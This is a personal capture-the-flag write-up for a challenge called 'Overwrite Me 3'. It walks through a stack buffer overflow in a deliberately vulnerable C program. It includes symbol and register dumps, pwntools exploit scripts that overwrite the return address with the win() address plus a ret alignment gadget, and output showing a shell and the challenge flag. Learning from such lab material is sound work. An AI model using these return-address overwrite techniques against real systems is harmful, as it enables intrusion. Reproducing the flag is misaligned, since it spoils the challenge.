## Overwrite Me 3

This challenge had me jump to another function in the code, without the function ever being called  in the c code.

The buffer array was only 32 bytes, but `fgets()` did not stop writing until it had written 64 bytes. This would overflow the buffer. 

We can see that the `win()` function executes `/bin/sh` which would give me a shell. Therefore that was the location to jump to.

```c
int main()
{
    char buffer[32];

    ignore_me_init_buffering();
    ignore_me_init_signal();
	
    printf("You now know how to hit payloads on offsets. Use this knowledge to force a win out of this program!\n\n");
	printf("Let's play. Guess a number between 1-10:\n");

	fgets(buffer, 64, stdin);

	if (strcmp(buffer, "5\n") != 0)
	{
		lose();
	}
	else
	{
		lose_again();
	}

	return 0;

}

lose()
{
	printf("Wrong. You lose!\n");
}

lose_again()
{
	printf("Pfft. Also wrong. You lose again!\n");
}

win()
{
	printf("Correct! You won! Here comes the shell\n");
	system("/bin/sh");
}
```

My first step was to find the address of the `win()` function. This was done by using `objdump -t`
on the binary file. 
The output here is truncated to better fit on the screen.

I saw that the win function had the address `0x00000000004013a6` in memory.

```c
0000000000000000       F *UND*  0000000000000000              strcmp@@GLIBC_2.2.5
0000000000000000       F *UND*  0000000000000000              signal@@GLIBC_2.2.5
0000000000000000  w      *UND*  0000000000000000              __gmon_start__
000000000040129b g     F .text  0000000000000033              kill_on_timeout
0000000000404068 g     O .data  0000000000000000              .hidden __dso_handle
0000000000402000 g     O .rodata        0000000000000004              _IO_stdin_used
00000000004013d0 g     F .text  0000000000000065              __libc_csu_init
00000000004013a6 g     F .text  0000000000000023              win
00000000004040b0 g       .bss   0000000000000000              _end
0000000000401180 g     F .text  0000000000000005              .hidden _dl_relocate_static_pie
0000000000401150 g     F .text  000000000000002f              _start
0000000000404070 g       .bss   0000000000000000              __bss_start
00000000004012f4 g     F .text  0000000000000084              main
0000000000000000       F *UND*  0000000000000000              setvbuf@@GLIBC_2.2.5
00000000004012ce g     F .text  0000000000000026              ignore_me_init_signal
000000000040138f g     F .text  0000000000000017              lose_again
0000000000000000       F *UND*  0000000000000000              exit@@GLIBC_2.2.5
0000000000404070 g     O .data  0000000000000000              .hidden __TMC_END__
0000000000401000 g     F .init  0000000000000000              .hidden _init
00000000004040a0 g     O .bss   0000000000000008              stderr@@GLIBC_2.2.5
```

The next step was to debugg the binary in gdb and find the offsett.
By running the binary with the string `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ` I could find out where the offsett was.

Below is how the registers looked after i executed the binary in gdb with the string above.
I could see that the `rsp` register contained `KKKKLLLLMMMMNNNNOOOOPPP`. The `rsp` register contains the address that gets popped into the `rip` register on a `ret` instruction. The `rip` register contains the address of the next instruction. Therefore I want to put the address of the `win()` function in the `rip`     register, to jump there and get a shell.

The padding for this exploit is therefore `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ`

In x86-64 the value in the `rsp` register does not get popped to `rip` unless it is a valid address. This was my first mistake, because i looked for the overflow in the `rip` register, but the values i passed in to find the offset were not valid addresses. x86 on the other hand does pop the value in `esp` into `eip` without checking if it is a valid address (`esp` and `eip` are the equivalent registers in x86).


```c
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x007ffff7e8da37  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x1
$rsp   : 0x007fffffffdb48  →  "KKKKLLLLMMMMNNNNOOOOPPP"
$rbp   : 0x4a4a4a4a49494949 ("IIIIJJJJ"?)
$rsi   : 0x1
$rdi   : 0x007ffff7f94a70  →  0x0000000000000000
$rip   : 0x00000000401377  →  <main+131> ret
$r8    : 0x10
$r9    : 0x0
$r10   : 0x007ffff7d82360  →  0x000f001a00007b95
$r11   : 0x246
$r12   : 0x007fffffffdc58  →  0x007fffffffdf12  →  "/home/mathias/ctf/kcsc/overwrite_me/overwrite3"
$r13   : 0x000000004012f4  →  <main+0> endbr64
$r14   : 0x0
$r15   : 0x007ffff7ffd040  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
```

I could now write my exploit. 

```python
from pwn import *

padding = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ"

win = p64(0x00000000004013a6)

p = remote("20.240.63.48", 30007)

p.recvuntil(b"Let's play. Guess a number between 1-10:\n")

p.sendline(padding + win)

p.interactive()
```

By running it i got this:
```shell
$ python3 exploit.py
[+] Opening connection to 20.240.63.48 on port 30007: Done
[*] Switching to interactive mode
Wrong. You lose!
[*] Got EOF while reading in interactive
```
I got an EOF (End Of File) Error. This was not supposed to happen. I did not really know what the problem was until i was sent this article by @tbi: https://ropemporium.com/guide.html

The issue seemed to be that the stack was unaligned. A so-called `MOVEAPS` issue. The link above said this: 
> movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra `ret` before returning into a function or return further into a function to skip a `push` instruction.

I decided to try pad an extra `ret` before the `win()` address. I was recommended https://github.com/JonathanSalwan/ROPgadget by @nicw.
This program can find ROPgadgets in a binary.
Running the program on the binary given in the challenge:

```shell
$ ROPgadget --binary overwrite3 --opcode c3
Opcodes information
============================================================
0x000000000040101a : c3
0x0000000000401184 : c3
0x00000000004011b0 : c3
0x00000000004011f0 : c3
0x000000000040121e : c3
0x0000000000401220 : c3
0x000000000040129a : c3
0x00000000004012cd : c3
0x00000000004012f3 : c3
0x0000000000401377 : c3
0x000000000040138e : c3
0x00000000004013a5 : c3
0x00000000004013c8 : c3
0x000000000040141f : c3
0x0000000000401434 : c3
0x0000000000401444 : c3
0x0000000000401454 : c3
```

The opcode `c3` is the opcode for the `ret` instruction, which i found here: https://shell-storm.org/x86doc/RET.html

By choosing one of the addresses above, I tried again.

```python
from pwn import *

padding = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ"

win = p64(0x00000000004013a6)

ret = p64(0x000000000040101a)

p = remote("20.240.63.48", 30007)

p.recvuntil(b"Let's play. Guess a number between 1-10:\n")

p.sendline(padding + ret + win)

p.interactive()
```


This time it worked and I did not get an EOF Error.
```shell
$ python3 exploit.py
[+] Opening connection to 20.240.63.48 on port 30007: Done
[*] Switching to interactive mode
Wrong. You lose!
Correct! You won! Here comes the shell
$ ls
flag.txt
overwrite_me3
ynetd
$ cat flag.txt
KCSC{w4it_th4ts_nOt_aLLow3d}
```